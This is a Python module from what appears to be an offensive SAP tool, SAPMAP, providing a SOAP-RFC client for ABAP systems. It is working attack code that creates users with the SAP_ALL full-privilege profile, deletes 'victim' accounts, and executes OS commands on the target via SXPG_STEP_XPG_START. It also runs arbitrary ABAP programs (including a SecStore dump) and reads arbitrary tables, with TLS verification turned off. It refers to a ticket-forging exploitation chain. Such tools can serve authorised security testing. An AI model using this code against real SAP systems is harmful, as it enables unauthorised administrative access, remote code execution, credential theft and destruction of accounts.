"""SAP SOAP-RFC client (HTTP basic auth).

Lets SAPMAP call RFC modules over HTTP against ABAP targets reachable
only on the ICM HTTP port (no dispatcher, no NW RFC SDK on the SAPMAP
host).  Phase 3a — supports just the FMs needed to ship "Create Remote
User over HTTP": RFC_PING, BAPI_USER_CREATE1, BAPI_USER_PROFILES_ASSIGN,
BAPI_TRANSACTION_COMMIT.

Companion module to sap_soap_rfc.py (which handles MYSAPSSO2-cookie
auth for the ticket-forging exploitation chain).  Both speak the same
SOAP-RFC wire format; they differ only in the auth header they emit.

Why not call SAP's published WSDL with zeep?  Because (1) the WSDL
endpoint requires authentication on most modern systems, (2) it pulls a
non-trivial dependency for four function calls, and (3) the envelope
shape is stable enough that handwritten templates outlive any code-gen
output anyway.
"""
from __future__ import annotations

import base64
import logging
import socket
import ssl
import urllib.error
import urllib.parse
import urllib.request

from sap_soap_envelopes import (
    build_bapi_transaction_commit,
    build_bapi_user_create1,
    build_bapi_user_delete,
    build_bapi_user_get_detail,
    build_bapi_user_profiles_assign,
    build_dest_check_connection,
    build_rfc_abap_install_and_run,
    build_rfc_get_system_info,
    build_rfc_ping,
    build_rfc_read_table,
    build_sxpg_step_xpg_start,
    build_sxpg_step_xpg_start_no_mxrow,
    parse_response,
)

logger = logging.getLogger(__name__)

_DEFAULT_PATH = "/sap/bc/soap/rfc"
_DEFAULT_TIMEOUT = 30.0


class SOAPRFCError(Exception):
    """HTTP/transport-layer failure (not an RFC-level error).

    RFC-level errors (ABAP exception, bad credentials, missing auth)
    arrive as structured `parse_response()` results with `ok=False`.
    SOAPRFCError is reserved for problems we can't open a SOAP envelope
    on at all: socket refused, TLS handshake failure, malformed HTTP.
    """


class SOAPRFCSession:
    """One SOAP-RFC connection to an ABAP target.

    A "session" is purely conceptual — every call is a fresh HTTP POST
    with its own basic-auth header.  We keep it as a class so callers
    can hold endpoint+credentials together and we can swap stateful
    auth modes (cookies, OAuth bearer) in later without changing call
    sites.
    """

    def __init__(self, host: str, port: int, client: str,
                 user: str, password: str,
                 https: bool = False,
                 path: str = _DEFAULT_PATH,
                 language: str = "EN",
                 timeout: float = _DEFAULT_TIMEOUT):
        self.host = host
        self.port = int(port)
        self.client = client or "000"
        self.user = user
        self.password = password
        self.https = bool(https)
        self.path = path or _DEFAULT_PATH
        self.language = language or "EN"
        self.timeout = float(timeout)

    # -----------------------------------------------------------------
    # HTTP / transport
    # -----------------------------------------------------------------

    @property
    def endpoint(self) -> str:
        scheme = "https" if self.https else "http"
        query = urllib.parse.urlencode({
            "sap-client": self.client,
            "sap-language": self.language,
        })
        return f"{scheme}://{self.host}:{self.port}{self.path}?{query}"

    def _auth_header(self) -> str:
        token = base64.b64encode(
            f"{self.user}:{self.password}".encode("utf-8")
        ).decode("ascii")
        return f"Basic {token}"

    def _ssl_ctx(self):
        """Self-signed certs are typical for internal SAP systems.
        Verifying would break against most lab + on-prem landscapes."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _post_soap(self, envelope_xml: str) -> str:
        """POST a SOAP envelope, return the response body as text.

        Raises SOAPRFCError on transport failure.  HTTP 500 with a
        SOAP-fault body is treated as a successful HTTP exchange —
        the fault is parsed downstream and surfaced via `error`.
        """
        body = envelope_xml.encode("utf-8")
        req = urllib.request.Request(
            self.endpoint, data=body, method="POST")
        req.add_header("Content-Type", "text/xml; charset=utf-8")
        # Empty quoted SOAPAction is what SAP's ICM expects for the
        # rfc service — non-empty values trigger 'invalid action'.
        req.add_header("SOAPAction", '""')
        req.add_header("Authorization", self._auth_header())
        req.add_header("User-Agent", "SAPMAP/1.0")

        try:
            with urllib.request.urlopen(
                    req, timeout=self.timeout,
                    context=self._ssl_ctx()) as r:
                return r.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            # SAP returns SOAP faults with HTTP 500 (and sometimes 401
            # for auth failure with an HTML body, not a SOAP fault) —
            # we pass the body through to the parser.  If the body is
            # empty/HTML the parser surfaces a descriptive error.
            try:
                return e.read().decode("utf-8", errors="replace")
            except Exception:
                raise SOAPRFCError(
                    f"HTTP {e.code} {e.reason} (no body)") from e
        except urllib.error.URLError as e:
            raise SOAPRFCError(f"URL error: {e.reason}") from e
        except (TimeoutError, socket.timeout) as e:
            raise SOAPRFCError(
                f"timeout after {self.timeout}s") from e
        except Exception as e:
            raise SOAPRFCError(f"{type(e).__name__}: {e}") from e

    # -----------------------------------------------------------------
    # FM-level operations
    # -----------------------------------------------------------------

    def test_connection(self) -> dict:
        """Call RFC_PING.  Returns the parse_response dict.

        Distinguishes between:
          - ok=True               → credentials valid, FM callable
          - ok=False with SOAP    → credentials invalid OR no auth for
                                     SRFC function group
          - SOAPRFCError raised   → host unreachable / wrong port / TLS
        """
        body = build_rfc_ping()
        try:
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            return {"ok": False, "params": {}, "tables": {},
                    "error": f"transport: {e}", "raw": ""}
        return parse_response(response_xml, "RFC_PING")

    def bapi_user_create1(self, username: str, password: str,
                          firstname: str = "SAPMAP",
                          lastname: str = "Tool",
                          user_type: str = "A") -> dict:
        body = build_bapi_user_create1(
            username, password, firstname, lastname, user_type)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_CREATE1")

    def bapi_user_profiles_assign(self, username: str,
                                  profiles: list) -> dict:
        body = build_bapi_user_profiles_assign(username, profiles)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_PROFILES_ASSIGN")

    def bapi_user_delete(self, username: str) -> dict:
        body = build_bapi_user_delete(username)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_DELETE")

    def bapi_transaction_commit(self, wait: bool = True) -> dict:
        body = build_bapi_transaction_commit(wait)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_TRANSACTION_COMMIT")

    # -----------------------------------------------------------------
    # Phase 3b: OS exec + table read + system info
    # -----------------------------------------------------------------

    def sxpg_step_xpg_start(self, command: str, params: str = "",
                            destination: str = "",
                            long_params: str = "",
                            mxrow: int = 9999) -> dict:
        """Run an OS command on the target via SXPG_STEP_XPG_START.

        Same FM the gateway-port pyrfc path uses — just over HTTP.
        Auto-retries without MXROW on older kernels that reject it
        (mirrors the pyrfc fallback in sapmap_rfc.execute_remote_command).
        """
        body = build_sxpg_step_xpg_start(
            command=command, params=params, destination=destination,
            long_params=long_params, mxrow=mxrow)
        response_xml = self._post_soap(body)
        parsed = parse_response(response_xml, "SXPG_STEP_XPG_START")
        # MXROW unsupported → SOAP fault with RFC_INVALID_PARAMETER.
        # Retry without it and merge result.
        if (not parsed["ok"]
                and "MXROW" in (parsed.get("error", "") or "").upper()):
            body2 = build_sxpg_step_xpg_start_no_mxrow(
                command=command, params=params,
                destination=destination, long_params=long_params)
            response_xml = self._post_soap(body2)
            parsed = parse_response(response_xml, "SXPG_STEP_XPG_START")
        return parsed

    def execute_os_command(self, command: str, params: str = "",
                           long_params: str = "") -> dict:
        """High-level OS exec — returns the same dict shape as
        sapmap_rfc.execute_local_command so callers can dispatch to
        either transport interchangeably:

            {"success": bool, "output": list[str], "error": str}

        Output comes from the LOG table (one MESSAGE/LINE/TEXT field
        per row depending on kernel).  STATUS='O'/'0'/'' = success;
        non-zero status with output still counts as success because
        commands like `whoami` exit 0 but some kernels still set a
        non-empty status string.
        """
        result = {"success": False, "output": [], "error": ""}
        try:
            parsed = self.sxpg_step_xpg_start(
                command=command, params=params,
                long_params=long_params)
        except SOAPRFCError as e:
            result["error"] = f"transport: {e}"
            return result

        if not parsed["ok"] and parsed.get("error"):
            # SOAP fault — auth rejected, FM not authorised, etc.
            result["error"] = parsed["error"]
            return result

        # LOG rows: dict items with MESSAGE / LINE / TEXT fields
        for row in parsed["tables"].get("LOG", []):
            line = (row.get("MESSAGE", "")
                    or row.get("LINE", "")
                    or row.get("TEXT", "") or "").strip()
            if line:
                result["output"].append(line)

        status = (parsed["params"].get("STATUS", "") or "").strip()
        if status in ("O", "0", ""):
            result["success"] = True
        elif result["output"]:
            # Some kernels return output even on non-zero status
            result["success"] = True
        else:
            result["error"] = (
                parsed.get("error") or f"SXPG status: {status}")
        return result

    def read_table(self, table: str, fields: list = None,
                   where: list = None, max_rows: int = 0,
                   delimiter: str = "|") -> dict:
        """Read a table via RFC_READ_TABLE.

        Returns:
          {
            "ok":      bool,
            "rows":    list[dict],   keyed by field name
            "fields":  list[str],    column names in column order
            "error":   str,
          }

        Each row dict maps FIELD_NAME → value, with values trimmed of
        the delimiter padding.  Caller doesn't need to know the WA
        split or column widths.
        """
        result = {"ok": False, "rows": [], "fields": [],
                  "error": ""}
        try:
            body = build_rfc_read_table(
                table=table, fields=fields, where=where,
                delimiter=delimiter, rowcount=max_rows)
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            result["error"] = f"transport: {e}"
            return result

        parsed = parse_response(response_xml, "RFC_READ_TABLE")
        if not parsed["ok"]:
            result["error"] = parsed["error"]
            return result

        # FIELDS table → column order + names
        column_names = []
        for f in parsed["tables"].get("FIELDS", []):
            name = (f.get("FIELDNAME", "") or "").strip()
            if name:
                column_names.append(name)
        result["fields"] = column_names

        # DATA table → list of WA strings, split by delimiter
        for row in parsed["tables"].get("DATA", []):
            wa = row.get("WA", "") or ""
            parts = wa.split(delimiter)
            row_dict = {}
            for idx, name in enumerate(column_names):
                row_dict[name] = (
                    parts[idx].strip() if idx < len(parts) else "")
            result["rows"].append(row_dict)
        result["ok"] = True
        return result

    def dest_check_connection(self, destination_name: str) -> dict:
        """Ping an SM59 destination via DEST_CHECK_CONNECTION.

        Returns a dict shaped like sapmap_rfc.ping_rfc_destination's
        result so the Retrieve RFCs loop can use either transport:

          {
            "ping_ok":       bool,    True when CONNECTION_TEST_RESULT
                                       is empty
            "logon_ok":      bool,    True when AUTHORIZATION_TEST_RESULT
                                       is empty
            "ping_message":  str,     CONNECTION_ERROR_TEXT or 'OK'
            "remote_sid":    str,     from CONNECTION_PROPERTIES.SYSID
            "remote_hostname": str,   from CONNECTION_PROPERTIES.RFCHOST
            "remote_ip":       str,   (always '' over SOAP — no follow-
                                       up RFC_GET_SYSTEM_INFO call;
                                       caller can resolve from URL)
            "remote_instance_nr": str, from RFCDEST suffix _NN
            "error":         str,
          }
        """
        result = {
            "ping_ok": False, "ping_message": "", "logon_ok": False,
            "remote_sid": "", "remote_hostname": "", "remote_ip": "",
            "remote_instance_nr": "", "error": "",
        }
        try:
            body = build_dest_check_connection(destination_name)
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            result["error"] = f"transport: {e}"
            return result

        parsed = parse_response(
            response_xml, "DEST_CHECK_CONNECTION")
        if not parsed["ok"] and parsed.get("error"):
            result["error"] = parsed["error"]
            return result

        conn_res = (parsed["params"].get(
            "CONNECTION_TEST_RESULT", "") or "").strip()
        auth_res = (parsed["params"].get(
            "AUTHORIZATION_TEST_RESULT", "") or "").strip()
        err_text = (parsed["params"].get(
            "CONNECTION_ERROR_TEXT", "") or "").strip()
        result["ping_ok"] = conn_res == ""
        result["logon_ok"] = auth_res == ""
        result["ping_message"] = (err_text or
                                  ("OK" if result["ping_ok"] else ""))

        props = parsed["params"].get("CONNECTION_PROPERTIES", {})
        if isinstance(props, dict):
            result["remote_sid"] = (props.get("SYSID", "")
                                    or "").strip()
            result["remote_hostname"] = (props.get("RFCHOST", "")
                                          or "").strip()
            rfcdest = (props.get("RFCDEST", "") or "").strip()
            if rfcdest:
                import re as _re
                m = _re.search(r'_(\d{2})$', rfcdest)
                if m:
                    result["remote_instance_nr"] = m.group(1)
        return result

    def install_and_run(self, abap_lines: list,
                        program_name: str = "ZSAPMAP",
                        mode: str = "F") -> dict:
        """Run an ABAP program via RFC_ABAP_INSTALL_AND_RUN.

        Returns the same {success, output, error, fm_name} shape as
        sapmap_rfc._run_abap_program so call sites can dispatch to
        either transport interchangeably.

        Uses a long HTTP timeout because the SAP kernel COMPILES the
        program before executing it — for a several-hundred-line ABAP
        report (SecStore hex-dump etc.) on a loaded box this can take
        15-30s.  Caller can override via session-level timeout if a
        specific report needs more headroom.
        """
        try:
            body = build_rfc_abap_install_and_run(
                abap_lines, program_name, mode)
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            return {"success": False, "output": [],
                    "error": f"transport: {e}",
                    "fm_name": "RFC_ABAP_INSTALL_AND_RUN"}
        parsed = parse_response(
            response_xml, "RFC_ABAP_INSTALL_AND_RUN")
        result = {"success": parsed["ok"], "output": [],
                  "error": parsed.get("error", ""),
                  "fm_name": "RFC_ABAP_INSTALL_AND_RUN"}
        for row in parsed["tables"].get("WRITES", []):
            line = (row.get("ZEILE", "")
                    or row.get("LINE", "")
                    or row.get("WA", "") or "").strip()
            if line:
                result["output"].append(line)
        return result

    def get_system_info(self) -> dict:
        """Read authoritative system info via RFC_GET_SYSTEM_INFO.

        Returns the parsed RFCSI_EXPORT structure keyed by SAP field
        names: RFCSYSID, RFCSAPRL (ABAP release, e.g. '754'),
        RFCKERNRL (kernel patch, e.g. '742'), RFCOPSYS (e.g.
        'Windows NT'), RFCDBSYS ('ADABAS D'), RFCDBHOST, RFCDATABS
        (database SID), RFCDEST, RFCHOST, RFCIPADDR, RFCMACH.

        Empty error means the read succeeded; the SOAP path returns
        the same info the unauthenticated /sap/public/info probe
        returns, but with authoritative auth context.
        """
        try:
            body = build_rfc_get_system_info()
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            return {"ok": False, "info": {},
                    "error": f"transport: {e}"}
        parsed = parse_response(response_xml, "RFC_GET_SYSTEM_INFO")
        if not parsed["ok"]:
            return {"ok": False, "info": {},
                    "error": parsed["error"]}
        info = parsed["params"].get("RFCSI_EXPORT", {})
        if not isinstance(info, dict):
            info = {}
        return {"ok": True, "info": info, "error": ""}

    def bapi_user_get_detail(self, username: str) -> dict:
        body = build_bapi_user_get_detail(username)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_GET_DETAIL")

    def get_user_profiles(self, username: str) -> dict:
        """High-level: read PROFILES + ACTIVITYGROUPS via BAPI.

        Returns:
          {
            "ok":          bool,   True when BAPI returned, even if
                                   the user has zero profiles
            "profiles":    list[str],   names from PROFILES.BAPIPROF
            "roles":       list[str],   names from ACTIVITYGROUPS.AGR_NAME
            "has_sap_all": bool,   True iff 'SAP_ALL' is in profiles
            "error":       str,    empty on success; populated when the
                                   BAPI itself rejected (S_USER_GRP
                                   missing → call-time auth failure)
          }

        Crucial property for the GUI: a missing-permission RETURN with
        an empty PROFILES table still gives ok=True with profiles=[] —
        the modal can then show "no profiles read" rather than
        pretending the call failed.
        """
        result = self.bapi_user_get_detail(username)
        out = {
            "ok": result["ok"],
            "profiles": [],
            "roles": [],
            "has_sap_all": False,
            "error": result.get("error", ""),
        }
        for row in result["tables"].get("PROFILES", []):
            name = (row.get("BAPIPROF", "") or "").strip()
            if name:
                out["profiles"].append(name)
        for row in result["tables"].get("ACTIVITYGROUPS", []):
            name = (row.get("AGR_NAME", "") or "").strip()
            if name:
                out["roles"].append(name)
        out["has_sap_all"] = "SAP_ALL" in out["profiles"]
        return out

    # -----------------------------------------------------------------
    # High-level orchestration
    # -----------------------------------------------------------------

    def create_user_with_sap_all(self, username: str,
                                 password: str) -> dict:
        """Create user → assign SAP_ALL → commit.

        Stops at the first failed step and surfaces it.  A "user
        already exists" failure on the create step still continues
        into profile assignment — the goal is SAP_ALL on the user,
        not strictly to be the one to create them.

        Returns:
          {
            "ok":      bool,        end-to-end outcome
            "step":    str,         which step failed (or "done")
            "error":   str,         empty on success
            "details": list,        per-step parse_response dicts
                                     [(step_name, parse_dict), ...]
          }
        """
        details = []

        ping = self.test_connection()
        details.append(("ping", ping))
        if not ping["ok"]:
            return {"ok": False, "step": "ping",
                    "error": ping.get("error", "ping failed"),
                    "details": details}

        create = self.bapi_user_create1(username, password)
        details.append(("create", create))
        # "User already exists" is BAPI error 01/102 — don't bail on
        # that one; we still want to (re-)assign SAP_ALL.
        if not create["ok"]:
            err = create.get("error", "")
            already_exists = (
                "already exists" in err.lower()
                or "01102" in err
                or "01 102" in err)
            if not already_exists:
                return {"ok": False, "step": "create",
                        "error": err, "details": details}

        assign = self.bapi_user_profiles_assign(username, ["SAP_ALL"])
        details.append(("profiles", assign))
        if not assign["ok"]:
            return {"ok": False, "step": "profiles",
                    "error": assign.get("error", "assign failed"),
                    "details": details}

        commit = self.bapi_transaction_commit(wait=True)
        details.append(("commit", commit))
        if not commit["ok"]:
            return {"ok": False, "step": "commit",
                    "error": commit.get("error", "commit failed"),
                    "details": details}

        return {"ok": True, "step": "done", "error": "",
                "details": details}


def delete_user_via_soap(host: str, port: int, client: str,
                         user: str, password: str,
                         victim_username: str,
                         https: bool = False) -> dict:
    """Delete victim_username via SOAP-RFC.  Drop-in shape for the
    sapmap_rfc.delete_user boolean return:

        {"success": bool, "message": str, "username": str}

    Calls BAPI_USER_DELETE + BAPI_TRANSACTION_COMMIT (delete is not
    auto-committed by the BAPI itself — same as create).  'User
    doesn't exist' (BAPI error 01/124) counts as success since the
    caller's goal is "absent on target" and we already are there.
    """
    sess = SOAPRFCSession(
        host=host, port=int(port), client=client or "000",
        user=user, password=password, https=bool(https),
    )
    # Verify creds first — same pre-check shape as
    # create_user_with_sap_all uses, keeps the failure mode consistent.
    ping = sess.test_connection()
    if not ping["ok"]:
        return {
            "success": False,
            "message": (f"SOAP-RFC RFC_PING failed: "
                        f"{ping.get('error', 'unknown')}"),
            "username": victim_username,
        }
    delete = sess.bapi_user_delete(victim_username)
    if not delete["ok"]:
        err = delete.get("error", "")
        # "User does not exist" → already absent, treat as success.
        # SAP message 01/124 is the standard one.
        already_gone = (
            "does not exist" in err.lower()
            or "01124" in err
            or "01 124" in err)
        if not already_gone:
            return {
                "success": False,
                "message": f"SOAP-RFC delete failed: {err}",
                "username": victim_username,
            }
    commit = sess.bapi_transaction_commit(wait=True)
    if not commit["ok"]:
        return {
            "success": False,
            "message": (f"SOAP-RFC commit failed: "
                        f"{commit.get('error', 'unknown')}"),
            "username": victim_username,
        }
    return {
        "success": True,
        "message": (f"User {victim_username} deleted via SOAP-RFC"),
        "username": victim_username,
    }


def create_user_via_soap(host: str, port: int, client: str,
                         user: str, password: str,
                         new_username: str, new_password: str,
                         https: bool = False) -> dict:
    """Create new_username/new_password with SAP_ALL via SOAP-RFC.

    Returns a dict shaped like sapmap_rfc.create_user_via_bapi so the
    propagate_from_node fast path can call either implementation
    interchangeably:

        {"success": bool, "message": str, "username": str}

    `success=True` means the user exists with SAP_ALL after this call —
    whether we created them fresh or hit "already exists" + SAP_ALL was
    successfully (re-)assigned.
    """
    sess = SOAPRFCSession(
        host=host, port=int(port), client=client or "000",
        user=user, password=password, https=bool(https),
    )
    outcome = sess.create_user_with_sap_all(new_username, new_password)
    if outcome["ok"]:
        return {
            "success": True,
            "message": (f"User {new_username} created with SAP_ALL "
                        f"via SOAP-RFC"),
            "username": new_username,
        }
    return {
        "success": False,
        "message": (f"SOAP-RFC failed at step={outcome['step']}: "
                    f"{outcome['error']}"),
        "username": new_username,
    }
